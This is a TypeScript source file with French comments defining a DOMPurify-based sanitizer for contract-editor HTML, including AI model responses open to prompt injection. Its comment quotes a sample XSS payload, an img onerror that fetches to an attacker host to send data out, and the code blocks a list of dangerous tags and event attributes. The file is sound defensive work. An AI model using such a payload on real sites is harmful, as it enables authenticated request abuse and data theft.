import DOMPurify from 'dompurify';

/**
 * SEC — Sanitization centralisée pour tout HTML d'origine non strictement contrôlée :
 *   - Réponses IA (Anthropic/Gemini) injectées dans l'éditeur de contrat
 *   - Templates utilisateur stockés en base
 *   - Conversion PDF -> HTML côté serveur (texte brut entouré de markup)
 *
 * Sans cette barrière, un PDF malicieux ou une prompt-injection IA peut faire entrer
 * un payload du type `<img src=x onerror=fetch('https://attacker/?c='+...)>` qui
 * s'exécute dans le contexte de la session admin (les cookies sensibles restent
 * HttpOnly mais l'attaquant peut faire des requêtes API authentifiées).
 *
 * Profil "richText" : on autorise les balises de formatage HTML usuel utilisées
 * dans les modèles de contrat (titres, paragraphes, listes, tableaux, images,
 * liens, formatage inline), mais on retire :
 *   - <script>, <iframe>, <object>, <embed>, <link>, <style>, <meta>
 *   - tous les attributs `on*` (onclick, onerror, onload, ...)
 *   - les URLs `javascript:`, `data:` (sauf images data:image/*)
 *   - les balises SVG (vecteur d'XSS via <foreignObject>, <script>)
 */
export function sanitizeRichHtml(dirty: string): string {
  if (!dirty) return '';
  return DOMPurify.sanitize(dirty, {
    USE_PROFILES: { html: true },
    FORBID_TAGS: ['script', 'iframe', 'object', 'embed', 'link', 'style', 'meta', 'svg'],
    FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover', 'onfocus', 'onblur',
                  'onchange', 'onsubmit', 'onkeydown', 'onkeyup', 'onkeypress'],
    ALLOW_DATA_ATTR: false,
  });
}
